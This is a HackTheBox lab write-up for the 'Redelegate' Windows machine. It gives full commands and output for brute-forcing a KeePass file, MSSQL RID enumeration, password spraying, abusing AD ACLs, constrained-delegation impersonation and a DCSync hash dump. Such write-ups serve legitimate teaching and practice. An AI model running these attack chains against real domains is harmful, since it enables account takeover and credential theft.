---
title: "[EN] - HackTheBox: Redelegate Write-Up"
date: 2026-02-12 11:07:00 +0700
categories: [HackTheBox, Boxes, Hard, Windows]
tags: [Anonymous FTP, Keepass, MSSQL, SID Bruteforcing, Password spray, ACLs abuse, Constrained delegation, Kerberos, Pass-the-Ticket, SeEnableDelegationPrivilege]
description: Redelegate is a hard-difficultly Windows machine that starts with Anonymous FTP access, which allows the attacker to download sensitive Keepass Database files. The attacker then discovers that the credentials in the database are valid for MSSQL local login, which leads to enumerate SIDs and performs a password spray attack. Being a member of the HelpDesk group, the newly compromised user account Marie.Curie has a User-Force-Change-Password Access Control setup over the Helen.Frost user account; that user account has privileges to get a PS remoting session onto the Domain Controller. The Helen.Frost user account also has the SeEnableDelegationPrivilege assigned and has full control over the FS01$ machine account, essentially allowing the attacker account to modify the msDS-AllowedToDelegateTo LDAP attribute and change the password of a computer object and perform a Constrained Delegation attack.
image: /assets/img/HTB-Redelegate_banner.png
---

## Enumeration

### Open TCP Ports

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ nmap -Pn -sVC -T4 -p- -oN nmap/TCP_all_services.nmap 10.129.234.50
Starting Nmap <REDACTED> ( https://nmap.org ) at 2026-02-12 14:15 CET
Nmap scan report for dc.redelegate.vl (10.129.234.50)
Host is up (0.084s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  12:11AM                  434 CyberAudit.txt
| 10-20-24  04:14AM                 2622 Shared.kdbx
|_10-20-24  12:26AM                  580 TrainingAgenda.txt
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-12 13:15:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2026-02-12T13:16:33+00:00; +3s from scanner time.
| ms-sql-info:
|   10.129.234.50:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-12T13:07:04
|_Not valid after:  2056-02-12T13:07:04
| ms-sql-ntlm-info:
|   10.129.234.50:1433:
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2026-02-11T13:04:28
|_Not valid after:  2026-08-13T13:04:28
| rdp-ntlm-info:
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-12T13:16:24+00:00
|_ssl-date: 2026-02-12T13:16:33+00:00; +3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

<SNIP>

49932/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.234.50:49932:
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-12T13:07:04
|_Not valid after:  2056-02-12T13:07:04
| ms-sql-info:
|   10.129.234.50:49932:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49932
|_ssl-date: 2026-02-12T13:16:33+00:00; +3s from scanner time.

<SNIP>

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-02-12T13:16:28
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.70 seconds
```

The nmap scan reveals a Domain Controller for the ``redelegate.vl`` domain, exposing the usual Active Directory services (**DNS**, **Kerberos**, **LDAP**, **SMB**, **RPC**).
Alongside **FTP** an **IIS**, two instances of **MSSQL**, and WinRM. With the domain name confirmed through the LDAP and Kerberos banners, we added ``dc.redelegate.vl`` and ``redelegate.vl`` to our hosts file.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ echo "10.129.234.50 dc.redelegate.vl redelegate.vl" | sudo tee -a /etc/hosts
```

#### Port 21/tcp - FTP

From the nmap scan, we already know that anonymous FTP login is allowed on the target, which we can quickly confirm below :

```bash
┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ nmap -sV --script=ftp-anon -p 21 $TARGET
Starting Nmap <REDACTED> ( https://nmap.org ) at 2026-10-07 19:09 CEST
Nmap scan report for dc.redelegate.vl (10.129.234.50)
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

Let's connect and download all the listed files to our attacking host :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ mkdir ftp_files && cd ftp_files

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate/ftp_files]
└──╼ [★]$ wget -m ftp://anonymous:anonymous@10.129.234.50
--2026-02-12 14:34:27--  ftp://anonymous:*password*@10.129.234.50/
           => ‘10.129.234.50/.listing’
Connecting to 10.129.234.50:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

<SNIP>

10.129.234.50/CyberAudit.txt    100%[=====================================================>]     434  --.-KB/s    in 0,05s

<SNIP>

10.129.234.50/Shared.kdbx       100%[=====================================================>]   2,56K  --.-KB/s    in 0,03s

<SNIP>

10.129.234.50/TrainingAgenda.tx 100%[=====================================================>]     580  --.-KB/s    in 0,05s

2026-02-12 14:34:31 (10,9 KB/s) - ‘10.129.234.50/TrainingAgenda.txt’ saved [580]

FINISHED --2026-02-12 14:34:31--
Total wall clock time: 3,2s
Downloaded: 4 files, 3,9K in 0,2s (17,9 KB/s)

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate/ftp_files]
└──╼ [★]$ mv 10.129.234.50/* . && rm -R 10.129.234.50

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate/ftp_files]
└──╼ [★]$ ll
total 12K
drwxr-xr-x 1 tatsuki tatsuki  112 12 févr. 14:34 .
drwxr-xr-x 1 tatsuki tatsuki   26 12 févr. 14:33 ..
-rw-r--r-- 1 tatsuki tatsuki  434 20 oct.   2024 CyberAudit.txt
-rw-r--r-- 1 tatsuki tatsuki 2,6K 20 oct.   2024 Shared.kdbx
-rw-r--r-- 1 tatsuki tatsuki  580 20 oct.   2024 TrainingAgenda.txt
```

With the files downloaded, we started looking through them to see if we could find anything useful :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate/ftp_files]
└──╼ [★]$ cat CyberAudit.txt
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate/ftp_files]
└──╼ [★]$ cat TrainingAgenda.txt
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them
```

We also tried to open the KeePass file (``Shared.kdbx``) but were prompted for the master password :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate/ftp_files]
└──╼ [★]$ kpcli --kdb=Shared.kdbx
Provide the master password:
```

Since we had no credentials at this point, we kept this in mind and set the KeePass file aside for later. 
Refocusing our attention on the ``TrainingAgenda.txt`` file, we found the following line particularly interesting: "_**Friday 18th October | 11.30 - 13.30 "Weak Passwords" - Why "SeasonYear!" is not a good password**_".
It is fair to assume that, since a dedicated training session addressed the risks of the ``SeasonYear!`` password pattern and not every employee attended it, some accounts might still be using a password built on this exact pattern.

Based on this assumption, we decided to generate a custom wordlist built around this pattern. 
To do so, we first wrote a simple Bash script that generates combination of season and year in the ``seasonYear!`` format :

```bash
#!/bin/bash
for season in spring summer autumn fall winter; do
    for year in $(seq 2022 2024); do
        echo "${season}${year}!"
    done
done > seasons_passwd.lst
```

Running the script produced the following wordlist :

```bash
┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ chmod +x season_passwd_gen.sh && ./season_passwd_gen.sh

┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ ls
season_passwd_gen.sh  seasons_passwd.lst

┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ cat seasons_passwd.lst
spring2022!
spring2023!
spring2024!
summer2022!
summer2023!
summer2024!
autumn2022!
autumn2023!
autumn2024!
fall2022!
fall2023!
fall2024!
winter2022!
winter2023!
winter2024!
```

The only piece still missing was the capitalization of the first letter, which we handled with a custom Hashcat rule :

```bash
┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate/toto]
└──╼ [★]$ cat custom.rule
c

┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate/toto]
└──╼ [★]$ hashcat --force seasons_passwd.lst -r custom.rule --stdout | sort -u > mut_password.list

┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate/toto]
└──╼ [★]$ cat mut_password.list
Autumn2022!
Autumn2023!

<SNIP>

Winter2023!
Winter2024!
```

With a usable wordlist in hand, we wrote a second Bash script to test each generated password against the KeePass database file :

```bash
#!/bin/bash
while read passwd; do
   echo "Testing password : $passwd"
  echo "$passwd" | kpcli --kdb=Shared.kdbx
done < mut_password.list
```

Running this script, we successfully recovered the KeePass master password : 

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ bash keepass_brute.sh
Testing password : Autumn2022!
Provide the master password: *************************
Couldn't load the file ftp_files/Shared.kdbx

Error(s) from File::KeePass:
The database key appears invalid or else the database is corrupt.

<SNIP>

Testing password : <REDACTED>
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>
```

We then enumerated the KeePass database entries and found credentials for an MSSQL guest account :

```bash
kpcli:/> cd Shared
kpcli:/Shared> ls
=== Groups ===
Finance/
HelpDesk/
IT/

kpcli:/Shared> show -f IT/SQL\ Guest\ Access
 Path: /Shared/IT/
Title: SQL Guest Access
Uname: SQLGuest
 Pass: zDPXXXXXXXXXXXXXXvii
  URL:
Notes:
```

#### Port 1433/tcp - MSSQL

We then tested these credentials against MSSQL and confirmed they were still valid.
```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ nxc mssql 10.129.234.50 -u 'SQLGuest' -p 'zDPXXXXXXXXXXXXXXvii' --local-auth
MSSQL   10.129.234.50   1433   DC    [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (EncryptionReq:False)
MSSQL   10.129.234.50   1433   DC    [+] DC\SQLGuest:zDPXXXXXXXXXXXXXXvii
```

Since this is only an MSSQL guest account, our options are fairly limited and enumerating MSSQL for additional credentials or misconfigurations turned up nothing interesting. 
We then recalled that NetExec's MSSQL module supports RID brute-forcing, and since the MSSQL instance is hosted directly on the Domain Controller, even a local guest account is enough to brute-force local account RIDs and because the host is a DC, enumerate domain users and groups in the process.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ nxc mssql 10.129.234.50 -u 'SQLGuest' -p 'zDPXXXXXXXXXXXXXXvii' --local-auth --rid-brute | tee -a mssql_rid_brute.txt
MSSQL   10.129.234.50   1433   DC    [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (EncryptionReq:False)
MSSQL   10.129.234.50   1433   DC    [+] DC\SQLGuest:zDPXXXXXXXXXXXXXXvii
MSSQL   10.129.234.50   1433   DC    498: REDELEGATE\Enterprise Read-only Domain Controllers
MSSQL   10.129.234.50   1433   DC    500: WIN-Q13O908QBPG\Administrator
MSSQL   10.129.234.50   1433   DC    501: REDELEGATE\Guest
MSSQL   10.129.234.50   1433   DC    502: REDELEGATE\krbtgt

<SNIP>

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ cat mssql_rid_brute.txt| grep -E '110[4-9]:|111[0-9]:' | awk -F'\\' '{print $2}'
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
Helpdesk
IT
Finance
DnsAdmins
DnsUpdateProxy
Ryan.Cooper
sql_svc
```

We then compiled a domain users list from these results :

```bash
┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ cat domain_users.lst
christine.flanders
marie.curie
helen.frost
michael.pontiac
mallory.roberts
james.dinkleberg
ryan.cooper
sql_svc
```

---

## Initial Access
### SQLGuest -> Marie.curie

Through our earlier enumeration, we brute-forced the KeePass database file and recovered a SQL Guest account. Using this account, we then brute-forced RIDs and obtained a list of domain users, groups, and computers. 
With this list of users in hand, we sprayed the ``SeasonYear!`` wordlist we had built for the KeePass file, to check whether any employees were reusing the same weak password pattern :

```bash
┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ nxc smb $TARGET -u domain_users.lst -p mut_password.list --continue-on-success | grep "+"
SMB    10.129.234.50   445    DC   [+] redelegate.vl\marie.curie:<REDACTED>
```

With our initial domain account in hand, we began domain enumeration by collecting BloodHound data for analysis :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ nxc ldap $DC_HOST -d 'redelegate.vl' -u 'marie.curie' -p '<REDACTED>' --dns-server 10.129.234.50 --bloodhound -c All
LDAP   10.129.234.50   389    DC    [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (signing:None) (channel binding:No TLS cert)
LDAP   10.129.234.50   389    DC    [+] redelegate.vl\marie.curie:<REDACTED>
LDAP   10.129.234.50   389    DC    Resolved collection methods: objectprops, trusts, dcom, localadmin, group, session, container, rdp, psremote, acl
LDAP   10.129.234.50   389    DC    Done in 0M 18S
LDAP   10.129.234.50   389    DC    Compressing output into /home/tatsuki/.nxc/logs/DC_10.129.234.50_2026-02-12_220950_bloodhound.zip
```

---

### Marie.curie -> Helen.Frost

Looking at ``Marie.Curie``'s ACLs and group memberships in BloodHound, we found that she is a member of the ``HELPDESK`` group, which holds a ``ForceChangePassword`` ACL over ``Helen.Frost``.

![](/assets/img/HTB-Redelegate-marie_curie_ACLs.png)

We then abused this ``ForceChangePassword`` ACL to reset ``Helen.Frost``'s password without needing to know her previous one :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ bloodyAD --host 10.129.234.50 -d 'redelegate.vl' -u 'marie.curie' -p '<REDACTED>' set password 'helen.frost' 'S3cUr3!P@$sW0rd195_'
[+] Password changed successfully!
```

Since ``Helen.Frost`` is a member of the ``Remote Management Users`` group, we authenticated to the DC with evil-WinRM :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ evil-winrm -i 10.129.234.50 -u 'helen.frost' -p 'S3cUr3!P@$sW0rd195_'

<SNIP>

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> cat ../Desktop/user.txt
2d7fa41840a9a0646976f45406441e9a
2d7fXXXXXXXXXXXXXXXXXXXXXX441e9a
```

---

## Privilege Escalation
### Helen.Frost -> Administrator

Enumerating ``Helen.Frost``'s privileges, we found that she holds ``SeEnableDelegationPrivilege`` :

```bash
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

The ``SeEnableDelegationPrivilege`` right is normally reserved for Domain Admins, and it allows its holder to mark computer or user accounts as trusted for Kerberos delegation, whether unconstrained or constrained. 
In practice, this means an account holding this privilege can set attributes such as ``msDS-AllowedToDelegateTo`` or flip the ``TRUSTED_TO_AUTH_FOR_DELEGATION`` flag on any object in the domain, effectively turning that object into a delegation capable service that can request Kerberos tickets on behalf of other users through the ``S4U2Self`` and ``S4U2Proxy`` extensions. 

From an attacker's perspective, obtaining this right on even a single low-privileged account is enough to configure constrained delegation for a computer account we control, and then abuse that trust relationship to impersonate higher privileged users, as long as they are not flagged as sensitive for delegation.

Checking the domain's machine account quota, we found it set to 0 :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ nxc ldap 10.129.234.50 -u 'helen.frost' -p 'S3cUr3!P@$sW0rd195_' -M maq
LDAP    10.129.234.50   389    DC    [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (signing:None) (channel binding:No TLS cert)
LDAP    10.129.234.50   389    DC    [+] redelegate.vl\helen.frost:S3cUr3!P@$sW0rd195_
MAQ     10.129.234.50   389    DC    [*] Getting the MachineAccountQuota
MAQ     10.129.234.50   389    DC    MachineAccountQuota: 0
```

This isn't a problem, since BloodHound showed that we have ``GenericAll`` over the computer account ``FS01$`` through our membership in the ``IT`` group, which means we can reuse this existing machine account for the constrained delegation attack instead of creating a new one.

![](/assets/img/HTB-Redelegate-helen_frost_to_fs01.png)

Since we don't have the password or NT hash for the ``FS01$`` account, we abused our ``GenericAll`` ACL to reset its password :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ bloodyAD -d 'redelegate.vl' -u 'helen.frost' -p 'S3cUr3!P@$sW0rd195_' --host 10.129.234.50 set password 'fs01$' 'NewP@ssw0rd123!'
[+] Password changed successfully!
```

With control over `fs01$` secured, we configured constrained delegation on the machine account :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ bloodyAD -d 'redelegate.vl' -u 'helen.frost' -p 'S3cUr3!P@$sW0rd195_' --host 10.129.234.50 set object 'fs01$' msDS-AllowedToDelegateTo -v 'CIFS/DC.redelegate.vl' -v 'LDAP/DC.redelegate.vl' -v 'HOST/DC.redelegate.vl'
[+] fs01$'s msDS-AllowedToDelegateTo has been updated
```

We confirmed the change was applied : 

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ bloodyAD -d 'redelegate.vl' -u 'helen.frost' -p 'S3cUr3!P@$sW0rd195_' --host 10.129.234.50 get object 'fs01$' --attr msDS-AllowedToDelegateTo
distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
msDS-AllowedToDelegateTo: LDAP/DC.redelegate.vl; HOST/DC.redelegate.vl; CIFS/DC.redelegate.vl
```

We then added the ``TRUSTED_TO_AUTH_FOR_DELEGATION`` flag to the machine account, which is required to perform ``S4U2Self`` instead of relying solely on ``S4U2Proxy`` :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ bloodyAD --host 10.129.234.50 -d 'redelegate.vl' -u 'helen.frost' -p 'S3cUr3!P@$sW0rd195_' add uac 'fs01$' -f 'TRUSTED_TO_AUTH_FOR_DELEGATION'
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to fs01$'s userAccountControl
```

When attempting to impersonate the ``Administrator`` user through ``S4U2Proxy``, the request failed, which hinted that the account might be protected :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ getST.py -spn CIFS/DC.redelegate.vl -impersonate Administrator 'redelegate.vl/fs01$:NewP@ssw0rd123!'
Impacket <REDACTED>

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user fs01$ or initial TGT not forwardable
```

Checking bloodHound confirmed that ``Administrator`` is marked as sensitive for delegation, meaning it cannot be targeted through this technique.

![](/assets/img/HTB-Redelegate-administrator_sensitive_flag.png)

Looking at other **Domain Admins**, we found another privileged user (``ryan.cooper``) who is not marked as sensitive :

![](/assets/img/HTB-Redelegate-ryan_cooper_sensitive_flag.png)

We used the constrained delegation setup to impersonate ``ryan.cooper`` and request a service ticket for the LDAP service on the DC, which would later let us perform a DCSync attack :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ getST.py -spn 'LDAP/DC.redelegate.vl' -impersonate 'ryan.cooper' 'redelegate.vl/fs01$:NewP@ssw0rd123!'
Impacket <REDACTED>

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating ryan.cooper
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in ryan.cooper.ccache
```

Using Ryan's Kerberos ticket, we performed a DCSync attack to retrieve the Administrator's NT hash, a step that is technically unnecessary since ``ryan.cooper`` is already a **Domain Admin**, but convenient for obtaining a stable set of administrator credentials :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ export KRB5CCNAME=ryan.cooper@LDAP_DC.redelegate.vl@REDELEGATE.VL.ccache

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ klist
Ticket cache: FILE:ryan.cooper@LDAP_DC.redelegate.vl@REDELEGATE.VL.ccache
Default principal: ryan.cooper@redelegate.vl

Valid starting       Expires              Service principal
13/02/2026 15:18:09  14/02/2026 01:18:09  LDAP/DC.redelegate.vl@REDELEGATE.VL
        renew until 14/02/2026 15:18:10

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ secretsdump.py -k -no-pass -just-dc-user Administrator $DC_HOST
Impacket <REDACTED>

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17XXXXXXXXXXXXXXXXXXXXXXffc0a7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3aXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXd1ccd173
Administrator:aes128-cts-hmac-sha1-96:b4fbXXXXXXXXXXXXXXXXXXXXXX37a3ac
Administrator:des-cbc-md5:102XXXXXXXXXXb2f
[*] Cleaning up...
```

Finally, we authenticated to the DC as ``Administrator`` and retrieved the root flag :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Redelegate]
└──╼ [★]$ evil-winrm -i 10.129.234.50 -u 'Administrator' -H 'ec17XXXXXXXXXXXXXXXXXXXXXXffc0a7'

<SNIP>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
6ef7XXXXXXXXXXXXXXXXXXXXXXd75537
```